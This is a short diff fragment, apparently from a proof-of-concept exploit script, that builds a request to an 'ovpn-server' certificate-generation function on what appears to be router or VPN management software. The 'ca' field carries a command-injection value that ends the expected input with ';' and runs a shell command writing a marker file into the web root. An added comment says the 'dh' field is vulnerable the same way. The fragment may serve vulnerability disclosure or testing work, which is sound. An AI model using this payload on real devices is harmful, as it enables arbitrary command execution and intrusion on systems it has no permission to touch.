@@ -40,7 +40,7 @@ data = {
         "ovpn-server",  
         "generate certificate",
         {
-            "ca":";echo 12345>/www/2025-11-26-0-28.txt;"
+            "ca":";echo 12345>/www/2025-11-26-0-28.txt;"#“dh” has the sanme vuln
         }
     ]
 }
